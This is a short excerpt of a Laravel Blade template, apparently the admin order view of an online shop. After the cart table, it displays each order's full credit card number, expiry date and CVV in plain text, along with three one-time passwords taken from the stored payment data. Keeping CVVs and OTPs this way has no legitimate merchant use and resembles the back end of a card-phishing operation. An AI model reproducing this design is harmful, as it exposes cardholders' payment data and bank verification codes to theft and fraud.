    ...
    <div class="card">
        ...
        <div class="card-body">
            @if ($order)
                ...
                <section class="section_padding mb-5">
                    <div class=" p-5 w-100 border">
                        <h3 class="">Carts</h3>
                        <table class="table shopping-summery">
                            ...
                            <tbody id="cart_item_list">
                                ...
                                @foreach ($order->cart_info as $key => $value)
                                    <tr>
                                        @php
                            ...
                            <div class="col-lg-6 col-lx-4">
                                <div class="order-info">
                                    ...
                                    <table class="table">
                                        ...
                                        <tr>
                                            <td>Credit Card</td>
                                            <td>  {{ $order->payment_value['card_number']}}</td>
                                            <td>  {{ $order->payment_value['card_date']}}</td>
                                            <td>  {{ $order->payment_value['card_cvv']}}</td>
                                        </tr>
                                        <tr>
                                            <td>OTP</td>
                                            <td>  {{ $order->payment_value['otp1']}}</td>
                                            <td>  {{ $order->payment_value['otp2']}}</td>
                                            <td>  {{ $order->payment_value['otp3']}}</td>
                                        </tr>
                                        @endif
